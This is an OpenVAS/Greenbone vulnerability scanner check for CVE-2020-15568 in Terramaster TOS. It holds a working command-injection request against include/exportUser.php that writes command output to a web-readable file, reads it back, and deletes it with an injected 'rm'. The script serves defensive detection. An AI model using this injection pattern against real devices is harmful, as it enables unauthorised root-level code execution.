CPE = "cpe:/a:noontec:terramaster";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.145288" );
	script_version( "2021-08-26T06:01:00+0000" );
	script_tag( name: "last_modification", value: "2021-08-26 06:01:00 +0000 (Thu, 26 Aug 2021)" );
	script_tag( name: "creation_date", value: "2021-02-01 04:59:24 +0000 (Mon, 01 Feb 2021)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2021-02-04 17:09:00 +0000 (Thu, 04 Feb 2021)" );
	script_cve_id( "CVE-2020-15568" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Terramaster TOS <= 4.1.24 RCE Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_terramaster_nas_detect.sc" );
	script_mandatory_keys( "terramaster_nas/detected" );
	script_tag( name: "summary", value: "Terramaster TOS is prone to a remote code (RCE) execution vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "TerraMaster TOS has Invalid Parameter Checking that leads to code injection
  as root. This is a dynamic class method invocation vulnerability in include/exportUser.php, in which an
  attacker can trigger a call to the exec method with (for example) OS commands in the opt parameter." );
	script_tag( name: "affected", value: "Terramaster TOS 4.1.24 and prior." );
	script_tag( name: "solution", value: "Update to version 4.1.29 or later." );
	script_xref( name: "URL", value: "https://ssd-disclosure.com/ssd-advisory-terramaster-os-exportuser-php-remote-code-execution/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
cmds = exploit_commands( "linux" );
base_url = "/include/exportUser.php?type=3&cla=application&func=_exec&opt=";
for pattern in keys( cmds ) {
	vtstrings = get_vt_strings();
	filename = vtstrings["default_rand"] + ".txt";
	url = base_url + cmds[pattern] + "%3E" + filename;
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req );
	req = http_get( port: port, item: "/include/" + filename );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: pattern, string: res )){
		report = "It was possible to execute the \"" + cmds[pattern] + "\" command.\n\nResult:\n\n" + res;
		security_message( port: port, data: report );
		url = base_url + "rm%20" + filename;
		req = http_get( port: port, item: url );
		res = http_keepalive_send_recv( port: port, data: req );
		exit( 0 );
	}
}
exit( 99 );

